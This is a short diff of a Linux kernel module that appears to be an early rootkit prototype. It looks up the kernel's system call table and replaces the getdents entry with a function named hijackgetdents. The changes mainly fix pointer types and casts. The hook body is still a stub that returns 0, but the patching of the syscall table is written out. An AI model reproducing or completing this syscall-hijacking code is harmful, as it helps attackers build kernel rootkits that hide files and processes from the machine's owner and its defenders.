@@ -12,11 +12,11 @@ MODULE_VERSION("0.1");
 
 #define SYS_CALL_TABLE "sys_call_table"
 
-extern void* syscall_table[];
+unsigned long* syscall_table;
 
 static void *originalGetDents = NULL;
 
-static asmlinkage long hijackgetdents(void){
+static asmlinkage long* hijackgetdents(void){
 
 return 0;
 
@@ -24,9 +24,9 @@ return 0;
 
 static int init_syscall(void)
 {
-        syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
+        syscall_table = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
         originalGetDents=syscall_table[sys_getdents];
-        syscall_table[sys_getdents]=hijackgetdents;
+        syscall_table[sys_getdents]=(unsigned long*) hijackgetdents;
         printk(KERN_INFO "Custom syscall loaded\n");
         return 0;
 }
